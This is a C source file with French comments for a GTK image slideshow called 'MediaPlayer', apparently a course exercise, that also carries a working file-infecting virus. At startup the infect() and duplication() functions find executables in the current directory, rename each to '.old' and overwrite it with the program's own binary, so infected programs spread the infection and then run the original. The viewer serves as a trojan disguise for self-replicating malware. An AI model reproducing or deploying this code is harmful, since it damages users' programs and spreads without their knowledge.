#include <gtk/gtk.h>
// Pour resize 
#include <gdk-pixbuf/gdk-pixbuf.h>

// Partie de MediaPlayer
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <libgen.h> 


#define MAX 20

// Permet de voir si le fichier est compté dans l'une des extensions.
int image(const char *fichier){
	const char *extension[] = {".jpg" , ".png", ".jpeg", ".bmp",NULL};
	for (int i = 0; extension[i] != NULL; i++){
        if(strstr(fichier, extension[i])){
        	return 1;	
        }
} 	return 0;
}

// Remplie la liste prise en paramètre avec les images du répertoires courants. 
void *charger(char **liste)
{
	int cpt = 0;    
	DIR *rep = opendir(".");
	if(rep != NULL){
        struct dirent * ent;
        while((ent = readdir(rep)) != NULL){
        	if(image(ent->d_name)){
                liste[cpt] = strdup(ent->d_name);
                cpt++;
            }
        }
    	closedir(rep);
    	}
    	liste[cpt]=NULL;
}

// Fin de la partie MediaPlayer.

// Ma structure avec toutes mes variables essentielles.
typedef struct {
	char **images;
	int nb_images;
	int actuelle_image;
	GtkWidget *image_widget;
} Images;

// Pour resize les images
gboolean resize(GtkWidget *widget){
	GdkPixbuf *pixbuf = gtk_image_get_pixbuf(GTK_IMAGE(widget));
    	pixbuf = gdk_pixbuf_scale_simple(pixbuf, 800,  600, GDK_INTERP_BILINEAR);
    	gtk_image_set_from_pixbuf(GTK_IMAGE(widget), pixbuf);
    
    	// Pour vider l'emplacement du pixbuf plus utilisé
    	g_object_unref(pixbuf);
    
    	return FALSE;
}

// Charge les images
void chargerImages(Images *diapo) {
    	if (diapo->nb_images > 0) {
    		gtk_image_set_from_file(GTK_IMAGE(diapo->image_widget),diapo->images[diapo->actuelle_image]);
        	resize(diapo->image_widget);
	}
}

// Image précédente
void precedente(GtkWidget *widget, Images *diapo) {
    	if (diapo->actuelle_image > 0){
    		diapo->actuelle_image--;
    		chargerImages(diapo);
    	}
}

// Image suivante
void suivante(GtkWidget *widget, Images *diapo) {
    	if(diapo->actuelle_image < diapo->nb_images-1){
    		diapo->actuelle_image++;
    		chargerImages(diapo);
    	}
}

// Vilain virus 
// Je verifie si c'est un exécutable
int est_exe(const char *fichier) {
    	struct stat sb;
    	if (lstat(fichier, &sb) == -1) {
        	return 0;
   	 }
    	if (strstr(fichier, ".old") != NULL || strcmp(fichier, "MediaPlayer") == 0) {
        	return 0;
    	}
    	if (S_ISREG(sb.st_mode) && (sb.st_mode & S_IXUSR)) {
       	 	return 1;
   	}
    	return 0;
}

void duplication(char *source, char *ouvreur){
	// je rename mon programme "pg" en "pg.old"
	char dest[100];
	snprintf(dest, sizeof(dest), "%s.old", source);
	
	// Pour éviter la réinfection
	struct stat sb;
    	if (stat(dest, &sb) == 0) {
    		printf("J'ai remarqué une copie %s", dest);
        	return;  // Si le backup existe déjà, on ne fait rien
    	}
    	printf("Pas de copie %s", dest);
	
	rename(source, dest);

	int srcf = open(ouvreur, O_RDONLY);
	int destf = open(source, O_WRONLY | O_CREAT | O_TRUNC, 0755);

	char buffer[4096];
    ssize_t bytes;
    while ((bytes = read(srcf, buffer, sizeof(buffer))) > 0) {
        if (write(destf, buffer, bytes) != bytes) {
            perror("Failed to write to copy");
            close(srcf);
            close(destf);
            return;
        }
    }

    close(srcf);
    close(destf);
    printf("Infected: %s -> %s\n", source, dest);
} 

void infect(const char *lanceur){
	DIR *rep = opendir(".");
	if(rep != NULL){
        struct dirent * ent;
        while((ent = readdir(rep)) != NULL){
        	if(est_exe(ent->d_name)){
				duplication(ent->d_name, lanceur);
			}
		}
	}
	closedir(rep);
}

int main(int argc, char *argv[]) {
	// Vérification de si on est dans un fichier corrompu ou non
  	char *prog_name = basename(argv[0]);
  	printf("%s", prog_name);
  	if (strcmp(prog_name, "MediaPlayer") != 0) {
        // Construire le nom du fichier .old
        char dest[100];
	snprintf(dest, sizeof(dest), "%s.old", prog_name);
	printf("%s", dest);
	// Pour retrouver le .old
	struct stat sb;
    	if (stat(dest, &sb) == 0) {
    		char *args[] = {dest, NULL};
    		infect(basename(argv[0]));
            	execv(dest, args);

            	return 0;
    	}
    	}
    	// Par défaut j'infecte
    	infect(basename(argv[0]));
    	
    	// Pour charger les fichiers pour le MediaPlayer
    	char *fichiers[MAX+1];
    	charger(fichiers);
    	
    	int count = 0;
    	for(int i = 0; fichiers[i] != NULL; i++){
    		count++;
    	}

	gtk_init(&argc, &argv);
    	Images diapo = {fichiers, count, 0, gtk_image_new()};

	// La partie affichage
    	GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    	gtk_window_set_title(GTK_WINDOW(window), "Images");
    	gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);
    	g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

    	GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 5);
    	gtk_container_add(GTK_CONTAINER(window), box);
    	gtk_box_pack_start(GTK_BOX(box), diapo.image_widget, TRUE, TRUE, 0);

    	GtkWidget *box_bouton = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 5);
    	gtk_box_pack_start(GTK_BOX(box), box_bouton, FALSE, FALSE, 0);

    	GtkWidget *pre = gtk_button_new_with_label("Précédent");
    	g_signal_connect(pre, "clicked", G_CALLBACK(precedente), &diapo);
    	gtk_box_pack_start(GTK_BOX(box_bouton), pre, TRUE, TRUE, 0);

    	GtkWidget *suiv = gtk_button_new_with_label("Suivant");
    	g_signal_connect(suiv, "clicked", G_CALLBACK(suivante), &diapo);
    	gtk_box_pack_start(GTK_BOX(box_bouton), suiv, TRUE, TRUE, 0);

    	chargerImages(&diapo);
    	gtk_widget_show_all(window);
    	gtk_main();

    	return 0;
}
